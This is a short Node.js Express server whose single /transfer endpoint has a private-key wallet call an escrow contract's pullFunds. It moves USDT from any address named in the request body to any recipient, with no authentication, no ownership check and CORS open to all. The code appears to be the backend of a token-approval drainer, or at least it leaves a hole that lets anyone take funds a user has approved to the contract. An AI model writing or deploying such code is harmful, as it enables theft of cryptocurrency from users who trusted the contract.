import express from "express";
import { ethers } from "ethers";
import dotenv from "dotenv";
import cors from "cors";

dotenv.config();

const app = express();
app.use(express.json());
app.use(cors());

const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

const escrow = new ethers.Contract(
  process.env.ESCROW_CONTRACT_ADDRESS,
  [
    "function pullFunds(address token, address user, address recipient, uint256 amount) external"
  ],
  wallet
);

app.post("/transfer", async (req, res) => {
  try {

    const { fromAddress, recipient, amount } = req.body;

    const parsedAmount = ethers.parseUnits(amount.toString(), 18);

    const tx = await escrow.pullFunds(
      process.env.USDT_TOKEN_ADDRESS,
      fromAddress,
      recipient,
      parsedAmount
    );

    await tx.wait();

    res.json({ success: true, hash: tx.hash });

  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});

